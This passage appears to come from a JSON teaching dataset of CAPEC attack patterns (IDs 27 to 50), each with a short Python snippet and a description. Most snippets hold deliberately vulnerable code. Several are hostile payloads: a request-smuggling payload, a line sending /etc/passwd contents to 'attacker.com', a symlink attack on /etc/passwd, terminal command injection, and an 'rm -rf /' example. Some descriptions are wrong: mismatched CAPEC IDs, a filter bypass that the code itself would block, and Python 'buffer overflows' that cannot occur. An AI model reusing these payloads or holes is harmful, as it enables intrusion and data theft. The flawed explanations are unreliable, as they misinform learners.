        "description": "This Python code snippet demonstrates a race condition vulnerability. The `write_to_file` function writes to a shared file twice with a delay in between, while the `read_from_file` function reads the file's content during the delay. The race condition occurs because the read operation can happen between the two write operations, leading to inconsistent or unexpected results. This example embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and related CWEs such as CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization) and CWE-366 (Race Condition within a Thread). The code highlights the risks of improper synchronization and concurrent access to shared resources."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "import os\nimport time\nimport tempfile\n\n# Simulate a privileged operation\nprivileged_temp_file = tempfile.NamedTemporaryFile(delete=False)\nprivileged_temp_file_name = privileged_temp_file.name\nprivileged_temp_file.close()\n\n# Attacker creates a symlink to a sensitive file\nsensitive_file = '/etc/passwd'\nattacker_symlink = privileged_temp_file_name\nos.symlink(sensitive_file, attacker_symlink)\n\n# Simulate a race condition\nif not os.path.exists(privileged_temp_file_name):\n    # Time-of-check\n    time.sleep(1)  # Simulate delay\n    # Time-of-use\n    with open(privileged_temp_file_name, 'w') as f:\n        f.write('malicious content')\n\n# Clean up\nos.remove(attacker_symlink)",
        "description": "This Python code snippet demonstrates a race condition vulnerability involving symbolic links (symlinks). The code simulates a privileged operation that creates a temporary file. An attacker creates a symlink pointing to a sensitive file (e.g., '/etc/passwd'). The race condition occurs between the check (os.path.exists) and the use (open and write) of the temporary file. If the attacker can create the symlink in this interval, the privileged operation will write to the sensitive file instead of the intended temporary file. This embodies the main idea of the CAPEC by leveraging race conditions and symlinks to write to sensitive files."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "import random\n\n# Function that simulates processing user input\ndef process_input(user_input):\n    try:\n        # Simulate a command execution with user input\n        result = eval(user_input)\n        return result\n    except Exception as e:\n        # Generate an error message containing sensitive information\n        return str(e)\n\n# Fuzzing function to generate random inputs\ndef fuzzing_test():\n    inputs = [\n        \"1 + 1\",  # Valid input\n        \"os.system('ls')\",  # Command injection\n        \"'a' * 1000000\",  # Large input\n        \"__import__('os').system('ls')\",  # Malicious code\n        \"'a' * 100 + '\"  # Incomplete input\n    ]\n    for i in range(5):\n        user_input = random.choice(inputs)\n        print(f\"Testing input: {user_input}\")\n        print(f\"Result: {process_input(user_input)}\\n\")\n\n# Run the fuzzing test\nfuzzing_test()",
        "description": "This Python code snippet demonstrates a simple fuzzing test to identify vulnerabilities in a function that processes user input. The `process_input` function uses `eval` to execute user-provided input, which is inherently dangerous and can lead to several vulnerabilities such as command injection (CWE-74), improper input validation (CWE-20), and embedded malicious code (CWE-506). The `fuzzing_test` function generates various types of inputs, including valid, malicious, and incomplete inputs, to test the robustness of the `process_input` function. The code also demonstrates the generation of error messages that may contain sensitive information (CWE-209). This snippet embodies the main idea of CAPEC-28 (Fuzzing) by using random inputs to uncover potential weaknesses in the system."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "import os\nimport time\nimport threading\n\n# Shared resource\nfile_path = 'example.txt'\n\n# Function to check and use the file\ndef check_and_use_file():\n    # Time of check\n    if os.path.exists(file_path):\n        print('File exists, proceeding to use it...')\n        # Simulate a delay\n        time.sleep(1)\n        # Time of use\n        with open(file_path, 'r') as file:\n            data = file.read()\n            print('File content:', data)\n    else:\n        print('File does not exist.')\n\n# Function to simulate an attacker modifying the file\ndef attacker_modify_file():\n    # Wait for a moment to ensure the race condition\n    time.sleep(0.5)\n    with open(file_path, 'w') as file:\n        file.write('Malicious content')\n    print('Attacker modified the file.')\n\n# Create the file initially\nwith open(file_path, 'w') as file:\n    file.write('Original content')\n\n# Create threads to simulate race condition\nthread1 = threading.Thread(target=check_and_use_file)\nthread2 = threading.Thread(target=attacker_modify_file)\n\n# Start threads\nthread1.start()\nthread2.start()\n\n# Wait for threads to complete\nthread1.join()\nthread2.join()",
        "description": "This Python code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition. The `check_and_use_file` function checks if a file exists and then reads its content after a delay. Meanwhile, the `attacker_modify_file` function simulates an attacker modifying the file during the delay. This creates a race condition where the file's state changes between the check and the use, potentially leading to unexpected behavior. The code uses threading to simulate concurrent execution, highlighting the vulnerability described in CAPEC-367 and related CWEs."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "import ctypes\nimport os\nimport time\nimport threading\n\n# Vulnerable function that simulates a privileged thread\nclass PrivilegedThread(threading.Thread):\n    def run(self):\n        while True:\n            print(\"Privileged operation\")\n            time.sleep(1)\n\n# Function to hijack the privileged thread\ndef hijack_thread(thread_id):\n    # Suspend the thread\n    ctypes.windll.kernel32.SuspendThread(thread_id)\n    \n    # Inject malicious code (simulated by changing the thread's context)\n    # This is a simplified example and does not represent actual code injection\n    print(\"Thread hijacked!\")\n    \n    # Resume the thread\n    ctypes.windll.kernel32.ResumeThread(thread_id)\n\n# Start the privileged thread\npriv_thread = PrivilegedThread()\npriv_thread.start()\n\n# Give the thread some time to start\ntime.sleep(2)\n\n# Hijack the privileged thread\nhijack_thread(priv_thread.ident)\n\n# Keep the main thread alive to observe the hijacked thread\nwhile True:\n    time.sleep(1)",
        "description": "This Python code snippet demonstrates a simplified version of hijacking a privileged thread of execution. The `PrivilegedThread` class simulates a thread performing privileged operations. The `hijack_thread` function suspends the thread, simulates injecting malicious code by printing a message, and then resumes the thread. This example embodies the CAPEC concept of hijacking a privileged thread by manipulating its execution context. The code also touches on related CWEs such as improper privilege management (CWE-270) and process control (CWE-114). Note that this is a simplified and non-functional example for educational purposes and does not represent actual malicious code injection techniques."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    # Simulate user authentication\n    if username == 'admin' and password == 'password':\n        # Create a cookie with sensitive information\n        resp = make_response('Logged in successfully')\n        resp.set_cookie('session_id', '123456', httponly=True)\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    session_id = request.cookies.get('session_id')\n    if session_id == '123456':\n        return 'Welcome to the dashboard!'\n    return 'Access denied', 403\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to several issues related to the CAPEC 'Accessing/Intercepting/Modifying HTTP Cookies'. The code includes a login route that sets a session cookie with sensitive information in cleartext (CWE-315). The session cookie is not encrypted (CWE-311) and is assumed to be immutable (CWE-302). The dashboard route relies on the session cookie for authentication without proper validation and integrity checking (CWE-565). This setup allows an attacker to intercept, modify, or misuse the session cookie to gain unauthorized access to the dashboard."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('query')\n    # Vulnerable to XSS\n    return render_template_string('<h1>Search Results for: {}</h1>'.format(query))\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) through HTTP query strings. The application has a single route '/search' that takes a 'query' parameter from the URL. The value of this parameter is directly inserted into the HTML response without any validation or sanitization, making it susceptible to XSS attacks. An attacker could craft a URL with a malicious script in the 'query' parameter, which would then be executed in the victim's browser when they visit the URL. This example embodies the main idea of the CAPEC by showing how improper neutralization of input (CWE-79, CWE-80) and improper encoding or escaping of output (CWE-116) can lead to XSS vulnerabilities."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "import socket\n\n# Create a socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('localhost', 8080))\n\n# Crafting a malicious HTTP request with smuggling\nmalicious_request = (\n    'POST / HTTP/1.1\\r\\n'\n    'Host: vulnerable-server\\r\\n'\n    'Content-Length: 13\\r\\n'\n    'Transfer-Encoding: chunked\\r\\n\\r\\n'\n    '0\\r\\n\\r\\n'\n    'GET /malicious HTTP/1.1\\r\\n'\n    'Host: vulnerable-server\\r\\n\\r\\n'\n)\n\n# Send the malicious request\ns.sendall(malicious_request.encode('utf-8'))\n\n# Receive the response\nresponse = s.recv(4096)\nprint(response.decode('utf-8'))\n\n# Close the socket\ns.close()",
        "description": "This Python code snippet demonstrates an HTTP Request Smuggling attack. The code creates a socket connection to a server running on localhost at port 8080. It then crafts a malicious HTTP request that exploits discrepancies in how different HTTP agents (e.g., proxies, load balancers) interpret the 'Content-Length' and 'Transfer-Encoding' headers. The request is designed to trick the intermediary into forwarding a hidden 'GET /malicious' request to the backend server. This embodies the main idea of CAPEC-33 (HTTP Request Smuggling) and highlights related weaknesses such as CWE-444 (Inconsistent Interpretation of HTTP Requests) and CWE-113 (Improper Neutralization of CRLF Sequences)."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET'])\ndef vulnerable():\n    user_input = request.args.get('input', '')\n    response = make_response('Hello, ' + user_input)\n    response.headers['Content-Type'] = 'text/html'\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to HTTP Response Splitting. The vulnerability arises because the user input is directly included in the HTTP response without proper neutralization of special characters like CR (Carriage Return) and LF (Line Feed). An attacker can exploit this by injecting CRLF sequences into the 'input' parameter, causing the server to split the HTTP response and potentially inject malicious headers or content. This example embodies the main idea of CAPEC-34 (HTTP Response Splitting) and is related to CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "import os\nimport json\n\ndef load_config(file_path):\n    with open(file_path, 'r') as file:\n        config = json.load(file)\n    return config\n\ndef execute_command(command):\n    os.system(command)\n\n# Simulate loading a configuration file\nconfig = load_config('config.json')\n\n# Vulnerable code: directly using a configuration parameter to execute a command\nexecute_command(config['command'])",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can leverage executable code in a non-executable file, specifically a configuration file. The `load_config` function reads a JSON configuration file, and the `execute_command` function executes a system command. The vulnerability arises when the `execute_command` function directly uses a parameter from the configuration file (`config['command']`) without proper validation or sanitization. This can lead to code injection (CWE-94) or improper neutralization of directives (CWE-96), allowing an attacker to execute arbitrary commands on the system. The code represents the main idea of CAPEC-184 by showing how trust in configuration files can be exploited to execute malicious code."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "class SensitiveOperations:\n    def __init__(self):\n        self._secret_data = \"Sensitive Information\"\n\n    def _hidden_function(self):\n        return self._secret_data\n\n    def public_function(self):\n        return \"Public Information\"\n\n# Simulating an attacker discovering and invoking the hidden function\nsensitive_ops = SensitiveOperations()\nprint(sensitive_ops._hidden_function())  # Accessing unpublished interface",
        "description": "This Python code snippet demonstrates a class `SensitiveOperations` with a hidden method `_hidden_function` that returns sensitive information. The method is intended to be private and not publicly accessible. However, due to the lack of proper access control mechanisms (authentication and authorization), an attacker can directly invoke this hidden method and access sensitive data. This embodies the CAPEC concept of 'Using Unpublished Interfaces or Functionality' and highlights related CWEs such as 'Missing Authentication for Critical Function' (CWE-306) and 'Missing Authorization' (CWE-862)."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "import os\n\n# CWE-312: Cleartext Storage of Sensitive Information\n# CWE-314: Cleartext Storage in the Registry\n# CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n# CWE-318: Cleartext Storage of Sensitive Information in Executable\n\n# Sensitive data stored in cleartext\nsensitive_data = 'password123'\n\n# Store sensitive data in a file (cleartext storage)\nwith open('sensitive_data.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# Store sensitive data in an environment variable (cleartext storage)\nos.environ['SENSITIVE_DATA'] = sensitive_data\n\n# Store sensitive data in a cookie (cleartext storage)\ncookie = f\"Set-Cookie: sensitive_data={sensitive_data}; HttpOnly\"\nprint(cookie)\n\n# Store sensitive data in a registry-like dictionary (cleartext storage)\registry = {}\nregistry['sensitive_data'] = sensitive_data\n\n# Store sensitive data in an executable (cleartext storage)\ndef get_sensitive_data():\n    return sensitive_data\n\n# Simulate a critical state transition without clearing sensitive data\n# CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n# CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\ndef critical_state_transition():\n    # Sensitive data is not cleared before state transition\n    pass\n\n# Simulate improper zeroization of sensitive data\n# CWE-1239: Improper Zeroization of Hardware Register\ndef improper_zeroization():\n    sensitive_data = None  # Data is not properly zeroized\n    return sensitive_data\n\n# Simulate exposure of sensitive system information due to uncleared debug information\n# CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\ndef enter_debug_mode():\n    debug_info = sensitive_data  # Sensitive data exposed in debug mode\n    return debug_info\n\n# Simulate insufficient data removal within hardware component\n# CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\ndef incomplete_data_removal():\n    sensitive_data = ' ' * len(sensitive_data)  # Data is not completely removed\n    return sensitive_data\n\n# Simulate remanent data readable after memory erase\n# CWE-1330: Remanent Data Readable after Memory Erase\ndef remanent_data_readable():\n    sensitive_data = ' ' * len(sensitive_data)  # Data is still recoverable\n    return sensitive_data",
        "description": "This Python code snippet demonstrates various ways sensitive data can be improperly handled, leading to potential vulnerabilities. The code stores sensitive information in cleartext in multiple locations, including a file, an environment variable, a cookie, and a registry-like dictionary. It also includes functions that simulate critical state transitions, improper zeroization, exposure of sensitive data in debug mode, incomplete data removal, and remanent data readability. These practices embody the main idea of CAPEC- Retrieve Embedded Sensitive Data, highlighting how sensitive information can be exposed and misused if not properly managed."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "import os\nimport sys\n\n# CWE-426: Untrusted Search Path\n# CWE-427: Uncontrolled Search Path Element\n# CWE-73: External Control of File Name or Path\n# CWE-99: Improper Control of Resource Identifiers\n\n# Simulate an attacker-controlled environment variable\nos.environ['PATH'] = '/malicious/path:' + os.environ['PATH']\n\n# Function that executes a system command\n# Vulnerable to path manipulation\n# CWE-426, CWE-427, CWE-73, CWE-99\n\ndef execute_command(command):\n    os.system(command)\n\n# Example usage\n# This will execute the malicious 'ls' if it exists in /malicious/path\nexecute_command('ls')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can manipulate the search path used by the program to execute commands. The code sets the PATH environment variable to include a malicious directory at the beginning. When the 'execute_command' function is called with a command like 'ls', the system will search for the 'ls' executable in the malicious directory first. If a malicious 'ls' executable is found, it will be executed instead of the legitimate one. This embodies the main idea of the CAPEC by showing how an attacker can leverage or manipulate configuration file search paths to execute malicious components. The code also touches on related CWEs by allowing external control of the search path and not properly controlling resource identifiers."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "from flask import Flask, request, make_response\nimport base64\n\napp = Flask(__name__)\n\n@app.route('/set_token')\ndef set_token():\n    user_id = request.args.get('user_id')\n    token = base64.b64encode(f'user_id={user_id}'.encode()).decode()\n    resp = make_response('Token set in cookie')\n    resp.set_cookie('auth_token', token)\n    return resp\n\n@app.route('/get_data')\ndef get_data():\n    token = request.cookies.get('auth_token')\n    if not token:\n        return 'No token found', 401\n    decoded_token = base64.b64decode(token).decode()\n    user_id = decoded_token.split('=')[1]\n    # No integrity check or validation of the token\n    return f'Access granted for user {user_id}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that sets and retrieves an authentication token stored in a cookie. The token is base64 encoded but lacks integrity checks and validation, making it vulnerable to manipulation. An attacker could modify the token to gain unauthorized access, embodying the CAPEC concept of 'Manipulating Opaque Client-based Data Tokens'. The related CWEs are represented as follows: CWE-353 (no integrity check), CWE-565 (reliance on cookies without validation), and CWE-315 (cleartext storage of sensitive information in a cookie)."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "import os\nimport sys\n\n# Simulate an attacker writing to a terminal device\nattacker_input = \"\\ncat /etc/passwd > /tmp/stolen_passwd\\n\"\n\n# Vulnerable terminal device file (e.g., /dev/pts/1)\nterminal_device = \"/dev/pts/1\"\n\ntry:\n    with open(terminal_device, 'w') as terminal:\n        terminal.write(attacker_input)\nexcept Exception as e:\n    print(f\"Error writing to terminal device: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can write malicious commands to a writable terminal device. The attacker_input variable contains a command string that, when executed by the target user, will copy the contents of /etc/passwd to a temporary file /tmp/stolen_passwd. The code attempts to open a terminal device (e.g., /dev/pts/1) and write the malicious command to it. If the target user unknowingly executes this command, the attacker can later retrieve the sensitive information. This example embodies the CAPEC 'Manipulating Writeable Terminal Devices' and highlights related CWEs such as command injection (CWE-77, CWE-78) and exposure of sensitive information (CWE-214)."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable function to send an email\ndef send_email(to_address, subject, body):\n    from_address = 'attacker@example.com'\n    # Construct email headers with potential meta-characters\n    headers = f\"From: {from_address}\\nTo: {to_address}\\nSubject: {subject}\\n\"\n    # Improper neutralization of meta-characters in headers\n    msg = MIMEText(body)\n    msg.set_payload(headers + body)\n\n    # Send the email\n    with smtplib.SMTP('localhost') as server:\n        server.sendmail(from_address, to_address, msg.as_string())\n\n# Example usage\nsend_email('victim@example.com', 'Hello', 'This is a test email.')",
        "description": "This Python code snippet demonstrates a vulnerable email-sending function that improperly handles meta-characters in email headers. The function `send_email` constructs email headers using string interpolation, which can be exploited by an attacker to inject malicious payloads. The headers are concatenated with the email body without proper neutralization or escaping of special characters, making it susceptible to injection attacks. This example embodies the CAPEC concept of using meta-characters in email headers to inject malicious payloads, and it highlights related CWEs such as improper neutralization of escape sequences (CWE-150) and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "import email\nfrom email import policy\nfrom email.parser import BytesParser\n\n# Simulate receiving an email with MIME content\nraw_email = b\"\"\"MIME-Version: 1.0\nContent-Type: text/plain; charset=utf-8\n\nThis is a test email with MIME content.\n\"\"\"\n\n# Parse the email\nmsg = BytesParser(policy=policy.default).parsebytes(raw_email)\n\n# Vulnerable function to convert MIME content to plain text\n# CWE-120: Buffer Copy without Checking Size of Input\n# CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n# CWE-20: Improper Input Validation\ndef convert_mime_to_text(mime_msg):\n    # Assume the buffer size is 256 bytes\n    buffer_size = 256\n    buffer = bytearray(buffer_size)\n    mime_content = mime_msg.get_payload(decode=True)\n    \n    # Vulnerable buffer copy operation\n    for i in range(len(mime_content)):\n        buffer[i] = mime_content[i]  # No bounds checking\n    \n    return buffer.decode('utf-8', errors='ignore')\n\n# Convert the MIME message to plain text\nplain_text = convert_mime_to_text(msg)\nprint(plain_text)",
        "description": "This Python code snippet demonstrates a vulnerable MIME conversion routine that can lead to a buffer overflow, as described in the CAPEC. The code simulates receiving an email with MIME content and then attempts to convert the MIME content to plain text. The `convert_mime_to_text` function contains a buffer overflow vulnerability (CWE-120 and CWE-119) because it copies the MIME content into a fixed-size buffer without checking if the content fits within the buffer. Additionally, the function lacks proper input validation (CWE-20), making it susceptible to attacks. This example highlights the risks associated with improper handling of MIME data in email systems."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "import os\n\n# First parser layer\nuser_input = input(\"Enter your command: \")\nparsed_input = user_input.replace(\"\\\\\", \"\")  # Remove escape characters\n\n# Input validation layer\nif any(char in parsed_input for char in [';', '&', '|']):\n    raise ValueError(\"Invalid characters in input!\")\n\n# Second parser layer\nfinal_command = parsed_input.replace(\"\\n\", \"\")  # Remove newlines\n\n# Execution of the command\nos.system(final_command)",
        "description": "This Python code snippet demonstrates the concept of 'Exploiting Multiple Input Interpretation Layers' (CAPEC-173). The code takes user input and processes it through multiple layers: the first parser layer removes escape characters, the input validation layer checks for dangerous characters, and the second parser layer removes newlines. However, the input validation occurs before the second parser layer, allowing an attacker to bypass the validation by using newline characters to disguise malicious input. For example, an attacker could input 'ls\\n; rm -rf /' which would pass the validation but be transformed into 'ls; rm -rf /' by the second parser layer, leading to command injection (CWE-77, CWE-78). This code highlights the importance of the correct order of input validation and parsing to prevent security vulnerabilities."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "import struct\n\ndef process_binary_file(file_path):\n    try:\n        with open(file_path, 'rb') as f:\n            data = f.read()\n            # Assume the first 4 bytes represent the size of the payload\n            payload_size = struct.unpack('<I', data[:4])[0]\n            # Vulnerable buffer allocation without size check\n            buffer = bytearray(256)\n            for i in range(payload_size):\n                buffer[i] = data[4 + i]\n            print('File processed successfully')\n    except Exception as e:\n        print(f'Error processing file: {e}')\n\n# Example usage\nprocess_binary_file('example.mp3')",
        "description": "This Python code snippet demonstrates a vulnerable function that processes a binary file, such as an MP3. The function reads the file and interprets the first 4 bytes as the size of the payload. It then attempts to copy the payload into a fixed-size buffer (256 bytes) without checking if the payload size exceeds the buffer size, leading to a potential buffer overflow (CWE-120, CWE-119). This vulnerability can be exploited by an attacker to execute arbitrary code by crafting a malicious binary file. The code embodies the main idea of the CAPEC by showing how a buffer overflow in handling binary resources can occur."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "import os\nimport sys\n\n# Function to read a symbolic link and copy its content to a buffer\n# CWE-120: Buffer Copy without Checking Size of Input\n# CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n# CWE-20: Improper Input Validation\ndef read_symlink_and_copy(link_path):\n    try:\n        # Read the symbolic link\n        target_path = os.readlink(link_path)\n        \n        # Open the target file\n        with open(target_path, 'r') as file:\n            data = file.read()\n            \n            # CWE-120: Buffer Copy without Checking Size of Input\n            # CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n            buffer = bytearray(256)  # Fixed-size buffer\n            for i in range(len(data)):\n                buffer[i] = ord(data[i])  # Potential buffer overflow\n            \n            print(\"Data copied to buffer:\", buffer)\n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(\"Usage: python script.py <symlink_path>\")\n        sys.exit(1)\n    \n    symlink_path = sys.argv[1]\n    read_symlink_and_copy(symlink_path)",
        "description": "This Python code snippet demonstrates a potential buffer overflow vulnerability via symbolic links. The function `read_symlink_and_copy` reads the target of a symbolic link and attempts to copy its content into a fixed-size buffer without proper bounds checking. This can lead to a buffer overflow if the content of the target file exceeds the buffer size. The code embodies the main idea of the CAPEC by leveraging symbolic links to cause buffer overflows and includes related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "import cgi\n\n# Vulnerable function to process user input\n\ndef process_input(form):\n    # CWE-20: Improper Input Validation\n    user_input = form.getvalue('user_input')\n    \n    # CWE-120: Buffer Copy without Checking Size of Input\n    buffer = [''] * 10  # Small buffer\n    for i in range(len(user_input)):\n        # CWE-118: Incorrect Access of Indexable Resource\n        buffer[i] = user_input[i]  # No bounds checking\n    \n    # CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n    print(''.join(buffer))\n\n# Simulate a form submission with oversized input\nform = cgi.FieldStorage()\nform.list = [cgi.MiniFieldStorage('user_input', 'A' * 100)]  # Oversized input\n\nprocess_input(form)",
        "description": "This Python code snippet demonstrates a vulnerable function that processes user input from a CGI form. The function `process_input` retrieves user input without proper validation (CWE-20: Improper Input Validation). It then attempts to copy this input into a fixed-size buffer without checking the input size (CWE-120: Buffer Copy without Checking Size of Input). The loop that copies the input to the buffer does not perform bounds checking, leading to potential buffer overflow (CWE-118: Incorrect Access of Indexable Resource and CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer). The code simulates a form submission with an oversized input to trigger the overflow, embodying the main idea of the CAPEC 'Overflow Variables and Tags' attack."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError('Input must be a string')\n\n    # CWE-131: Incorrect Calculation of Buffer Size\n    buffer_size = len(user_input) * 2\n    buffer = [''] * buffer_size\n\n    # CWE-120: Classic Buffer Overflow\n    for i in range(len(user_input)):\n        buffer[i] = user_input[i]\n\n    # CWE-74: Improper Neutralization of Special Elements\n    expanded_input = os.path.expandvars(''.join(buffer))\n\n    # CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n    for i in range(len(expanded_input)):\n        buffer[i] = expanded_input[i]  # Potential buffer overflow\n\n    return ''.join(buffer)\n\n# Example usage\nuser_input = 'A' * 1000  # Large input to trigger overflow\nprint(vulnerable_function(user_input))",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability via parameter expansion. The function `vulnerable_function` takes user input and performs several operations that lead to a buffer overflow. Initially, it validates the input type (CWE-20). It then incorrectly calculates the buffer size (CWE-131) by doubling the length of the input string. The input is copied into the buffer without checking bounds (CWE-120). The input is then expanded using `os.path.expandvars`, which can increase its size. Finally, the expanded input is copied back into the buffer without proper bounds checking (CWE-119), leading to a potential buffer overflow. This code embodies the main idea of the CAPEC by showing how input expansion can lead to a buffer overflow if not properly handled."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "import requests\n\n# Function that expects a URL but can be tricked into accessing local files\ndef fetch_data(url):\n    try:\n        response = requests.get(url)\n        return response.text\n    except Exception as e:\n        return str(e)\n\n# Attacker controlled input\nuser_input = 'file:///etc/passwd'\n\n# Fetch data using the user input\nresult = fetch_data(user_input)\n\n# Send the fetched data to an attacker controlled server\nattacker_server = 'http://attacker.com/collect'\nrequests.get(f'{attacker_server}?data={result}')",
        "description": "This Python code snippet demonstrates a vulnerability where a function expects a URL but can be tricked into accessing local files. The `fetch_data` function is designed to fetch data from a given URL using the `requests.get` method. However, if an attacker provides a local file path (e.g., 'file:///etc/passwd'), the function will read the local file instead. The fetched data is then sent to an attacker-controlled server using another GET request, potentially exposing sensitive information. This code embodies the main idea of the CAPEC by showing how improper handling of input types (CWE-241) and reliance on external references (CWE-706) can lead to security vulnerabilities."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "import itertools\nimport string\n\n# Weak password requirements (CWE-521)\npassword_length = 4\nalphabet = string.ascii_lowercase\n\n# Simulate a stored password in plaintext (CWE-257)\nstored_password = 'pass'\n\n# Brute force attack\nfor attempt in itertools.product(alphabet, repeat=password_length):\n    attempt_password = ''.join(attempt)\n    print(f'Trying password: {attempt_password}')\n    if attempt_password == stored_password:\n        print('Password found:', attempt_password)\n        break\n\n# No restriction on excessive authentication attempts (CWE-307)\n# Single-factor authentication (CWE-308)\n# Reliance on a single factor (CWE-654)\n# No password aging (CWE-262)\n# Long expiration period (CWE-263)\n# Use of password system for primary authentication (CWE-309)",
        "description": "This Python code snippet demonstrates a brute force attack on a weak password system. The code uses itertools to generate all possible combinations of a 4-character password using lowercase letters (CWE-521). The stored password is kept in plaintext (CWE-257), making it vulnerable to attacks. The code iterates through each possible password combination and checks if it matches the stored password, simulating a brute force attack (CAPEC-112). The snippet highlights several weaknesses: no restriction on excessive authentication attempts (CWE-307), reliance on single-factor authentication (CWE-308), and no password aging mechanism (CWE-262, CWE-263). The use of a password system as the primary means of authentication (CWE-309) and reliance on a single factor (CWE-654) are also demonstrated."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "import hashlib\n\n# Weak password recovery mechanism\nusers = {\n    'user1': {'password': '5f4dcc3b5aa765d61d8327deb882cf99', 'security_answer': 'petname'},  # 'password' hashed with MD5\n}\n\n# Function to recover password\ndef recover_password(username, security_answer):\n    if username in users and users[username]['security_answer'] == security_answer:\n        return users[username]['password']  # Returning hashed password directly\n    return 'Invalid username or security answer'\n\n# Example usage\nusername = 'user1'\nsecurity_answer = 'petname'\nprint(recover_password(username, security_answer))",
        "description": "This Python code snippet demonstrates a weak password recovery mechanism, embodying the main idea of CAPEC-139: Password Recovery Exploitation. The code stores user passwords in a recoverable format (MD5 hash) and uses a simple security question for password recovery. If an attacker knows or guesses the security answer, they can retrieve the hashed password, which is susceptible to further attacks (e.g., dictionary attacks). This example highlights several related CWEs: CWE-640 (Weak Password Recovery Mechanism), CWE-257 (Storing Passwords in a Recoverable Format), and CWE-522 (Insufficiently Protected Credentials)."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
